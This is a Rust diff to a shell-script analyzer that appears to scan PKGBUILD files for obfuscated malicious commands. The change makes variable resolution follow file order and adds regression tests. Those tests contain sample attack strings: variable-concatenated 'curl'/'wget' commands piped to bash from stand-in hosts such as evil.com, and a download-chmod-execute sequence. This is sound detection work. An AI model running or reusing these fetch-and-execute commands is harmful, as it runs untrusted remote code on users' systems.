@@ -178,10 +178,7 @@ impl Feature for ShellAnalysis {
 }
 
 fn analyze_content(content: &str, id_prefix: &str, desc_suffix: &str) -> Vec<Signal> {
-    let env = build_var_env(content);
-    let mut signals = Vec::new();
-    signals.extend(analyze_variable_resolution(content, &env));
-    signals.extend(analyze_indirect_execution(content, &env));
+    let mut signals = analyze_ordered_variable_usage(content);
     signals.extend(analyze_charbychar_construction(content));
     signals.extend(analyze_data_blobs(content));
     signals.extend(analyze_binary_download(content));
@@ -223,29 +220,60 @@ fn analyze_obfuscated_download_execute(content: &str) -> Vec<Signal> {
 
 // --- Helpers ---
 
-/// Build a variable environment from all assignments in the content.
-fn build_var_env(content: &str) -> HashMap<String, String> {
+/// Analyze uses against the variable state that exists at that point in the
+/// file. A later benign reassignment must never retroactively rewrite an
+/// earlier executable command.
+fn analyze_ordered_variable_usage(content: &str) -> Vec<Signal> {
     let standard: HashSet<&str> = PKGBUILD_STANDARD_VARS.iter().copied().collect();
     let mut env = HashMap::new();
+    let mut signals = Vec::new();
+    let mut found_exec = false;
+    let mut found_cmd = false;
+    let mut found_indirect = false;
 
-    for line in content.lines() {
+    for (line_index, line) in content.lines().enumerate() {
+        let mut cursor = 0usize;
         for caps in ASSIGN_RE.captures_iter(line) {
+            let assignment = caps.get(0).expect("assignment regex has a full match");
+            analyze_variable_segment(
+                &line[cursor..assignment.start()],
+                line,
+                line_index + 1,
+                &env,
+                &mut found_exec,
+                &mut found_cmd,
+                &mut found_indirect,
+                &mut signals,
+            );
+
             let name = &caps[1];
-            if standard.contains(name) {
-                continue;
+            if !standard.contains(name) {
+                // Value is in group 2 (double-quoted), 3 (single-quoted), or 4
+                // (unquoted). Keep the existing single-pass substitution
+                // behavior while applying each value only after its assignment.
+                let value = caps
+                    .get(2)
+                    .or_else(|| caps.get(3))
+                    .or_else(|| caps.get(4))
+                    .map(|m| m.as_str())
+                    .unwrap_or("");
+                env.insert(name.to_string(), value.to_string());
             }
-            // Value is in group 2 (double-quoted), 3 (single-quoted), or 4 (unquoted)
-            let value = caps
-                .get(2)
-                .or_else(|| caps.get(3))
-                .or_else(|| caps.get(4))
-                .map(|m| m.as_str())
-                .unwrap_or("");
-            env.insert(name.to_string(), value.to_string());
+            cursor = assignment.end();
         }
+        analyze_variable_segment(
+            &line[cursor..],
+            line,
+            line_index + 1,
+            &env,
+            &mut found_exec,
+            &mut found_cmd,
+            &mut found_indirect,
+            &mut signals,
+        );
     }
 
-    env
+    signals
 }
 
 /// Substitute $VAR and ${VAR} references with known values from the environment.
@@ -325,106 +353,80 @@ fn contains_multi_var_dangerous_cmd(
 
 // --- Sub-Analyzers ---
 
-/// Detect variable concatenation that resolves to dangerous commands.
-fn analyze_variable_resolution(content: &str, env: &HashMap<String, String>) -> Vec<Signal> {
-    let mut signals = Vec::new();
-    let mut found_exec = false;
-    let mut found_cmd = false;
+#[allow(clippy::too_many_arguments)]
+fn analyze_variable_segment(
+    segment: &str,
+    display_line: &str,
+    line_number: usize,
+    env: &HashMap<String, String>,
+    found_exec: &mut bool,
+    found_cmd: &mut bool,
+    found_indirect: &mut bool,
+    signals: &mut Vec<Signal>,
+) {
+    if segment.contains('$') {
+        let resolved = resolve_variables(segment, env);
 
-    for (i, line) in content.lines().enumerate() {
-        // Skip lines with no variable references
-        if !line.contains('$') {
-            continue;
-        }
-
-        let resolved = resolve_variables(line, env);
-        if resolved == line {
-            continue; // nothing was substituted
-        }
-
-        // Check for download-and-execute pipe
-        if !found_exec && let Some((dl, exec)) = contains_dangerous_pipe(&resolved) {
-            // Only flag if the original line didn't already have this pattern
-            let orig_lower = line.to_lowercase();
-            if !(orig_lower.contains(dl) && orig_lower.contains(exec)) {
+        if !*found_exec
+            && resolved != segment
+            && let Some((dl, exec)) = contains_dangerous_pipe(&resolved)
+        {
+            let original = segment.to_lowercase();
+            if !(original.contains(dl) && original.contains(exec)) {
                 signals.push(Signal {
                     id: "SA-VAR-CONCAT-EXEC".to_string(),
                     category: SignalCategory::Pkgbuild,
                     points: 85,
                     description: format!(
                         "variable concatenation resolves to '{}|{}' (line {})",
-                        dl,
-                        exec,
-                        i + 1
+                        dl, exec, line_number
                     ),
                     is_override_gate: true,
-                    matched_line: Some(line.trim().to_string()),
+                    matched_line: Some(display_line.trim().to_string()),
                 });
-                found_exec = true;
-                continue;
+                *found_exec = true;
             }
         }
 
-        // Check for dangerous command appearing after resolution
-        if !found_cmd && let Some(cmd) = contains_multi_var_dangerous_cmd(line, &resolved, env) {
+        if !*found_cmd
+            && resolved != segment
+            && let Some(cmd) = contains_multi_var_dangerous_cmd(segment, &resolved, env)
+        {
             signals.push(Signal {
                 id: "SA-VAR-CONCAT-CMD".to_string(),
                 category: SignalCategory::Pkgbuild,
                 points: 55,
                 description: format!(
                     "variable concatenation resolves to '{}' (line {})",
-                    cmd,
-                    i + 1
+                    cmd, line_number
                 ),
                 is_override_gate: false,
-                matched_line: Some(line.trim().to_string()),
+                matched_line: Some(display_line.trim().to_string()),
             });
-            found_cmd = true;
-        }
-
-        if found_exec && found_cmd {
-            break;
+            *found_cmd = true;
         }
     }
 
-    signals
-}
-
-/// Detect variables holding dangerous commands used in execution position.
-fn analyze_indirect_execution(content: &str, env: &HashMap<String, String>) -> Vec<Signal> {
-    // Find variables whose values are dangerous commands
-    let dangerous_vars: Vec<(&str, &str)> = env
-        .iter()
-        .filter_map(|(name, value)| {
-            let lower = value.to_lowercase();
-            DANGEROUS_COMMANDS
-                .iter()
-                .find(|&&cmd| lower == cmd)
-                .map(|&cmd| (name.as_str(), cmd))
-        })
-        .collect();
-
-    if dangerous_vars.is_empty() {
-        return Vec::new();
+    if *found_indirect {
+        return;
     }
-
-    for (var_name, cmd) in &dangerous_vars {
-        // Check if $VAR or ${VAR} appears in execution position:
-        // - after |
-        // - at line start (ignoring whitespace)
-        // - after ; && ||
+    for (var_name, value) in env {
+        let lower = value.to_lowercase();
+        let Some(cmd) = DANGEROUS_COMMANDS
+            .iter()
+            .find(|&&cmd| lower == cmd)
+            .copied()
+        else {
+            continue;
+        };
         let pattern = format!(
             r"(?m)(?:^|\||\|\||&&|;)\s*\$\{{?{}\}}?",
             regex::escape(var_name)
         );
         if let Ok(re) = Regex::new(&pattern)
-            && re.is_match(content)
+            && re.is_match(segment)
         {
-            let matched_line = content
-                .lines()
-                .find(|line| re.is_match(line))
-                .map(|line| line.trim().to_string());
-            return vec![Signal {
+            signals.push(Signal {
                 id: "SA-INDIRECT-EXEC".to_string(),
                 category: SignalCategory::Pkgbuild,
                 points: 70,
@@ -433,12 +435,12 @@ fn analyze_indirect_execution(content: &str, env: &HashMap<String, String>) -> V
                     var_name, cmd
                 ),
                 is_override_gate: false,
-                matched_line,
-            }];
+                matched_line: Some(display_line.trim().to_string()),
+            });
+            *found_indirect = true;
+            break;
         }
     }
-
-    Vec::new()
 }
 
 /// Detect char-by-char command construction via printf/echo subshells.
@@ -638,8 +640,8 @@ fn analyze_binary_download(content: &str) -> Vec<Signal> {
         return Vec::new();
     }
 
-    let lower = content.to_lowercase();
-    let has_build_cmd = BUILD_COMMANDS.iter().any(|&cmd| lower.contains(cmd));
+    let has_build_cmd =
+        crate::shared::shell_syntax::contains_executable_command(content, BUILD_COMMANDS);
 
     if has_build_cmd {
         return Vec::new();
@@ -717,6 +719,30 @@ mod tests {
     fn var_concat_wget_pipe() {
         let ids = analyze("x=wg\ny=et\n$x$y -q -O- http://evil.com | bash");
         assert!(has(&ids, "SA-VAR-CONCAT-EXEC"));
+    }
+
+    #[test]
+    fn later_reassignment_cannot_poison_earlier_command() {
+        let ids = analyze(
+            "first=cu\nsecond=rl\n$first$second https://evil.invalid/payload | bash\nfirst=true\nsecond=true\n",
+        );
+        assert!(has(&ids, "SA-VAR-CONCAT-EXEC"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn same_line_later_reassignment_cannot_poison_earlier_command() {
+        let ids = analyze(
+            "first=cu;second=rl\n$first$second https://evil.invalid/payload | bash;first=true;second=true\n",
+        );
+        assert!(has(&ids, "SA-VAR-CONCAT-EXEC"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn reassignment_before_use_applies_to_later_command() {
+        let ids = analyze(
+            "first=cu;second=rl\nfirst=true;second=true\n$first$second https://example.invalid/payload | bash\n",
+        );
+        assert!(!has(&ids, "SA-VAR-CONCAT-EXEC"), "got: {ids:?}");
     }
 
     #[test]
@@ -953,6 +979,32 @@ mod tests {
             "wget -O src.tar.gz https://example.com/src.tar.gz\nchmod +x build.sh\ncargo build\n",
         );
         assert!(!has(&ids, "SA-BINARY-DOWNLOAD-NOCOMPILE"));
+    }
+
+    #[test]
+    fn inert_build_markers_do_not_suppress_binary_download() {
+        for marker in [r#": "make""#, "echo cargo", "# cmake"] {
+            let ids = analyze(&format!(
+                "curl -o payload https://evil.invalid/payload\nchmod +x payload\n./payload\n{marker}\n"
+            ));
+            assert!(
+                has(&ids, "SA-BINARY-DOWNLOAD-NOCOMPILE"),
+                "{marker}: {ids:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn wrapped_and_literal_shell_build_commands_suppress_binary_download() {
+        for marker in ["env make", r#"bash -c "cargo build""#] {
+            let ids = analyze(&format!(
+                "curl -o src.tar.gz https://example.invalid/src.tar.gz\nchmod +x output\n{marker}\n"
+            ));
+            assert!(
+                !has(&ids, "SA-BINARY-DOWNLOAD-NOCOMPILE"),
+                "{marker}: {ids:?}"
+            );
+        }
     }
 
     #[test]
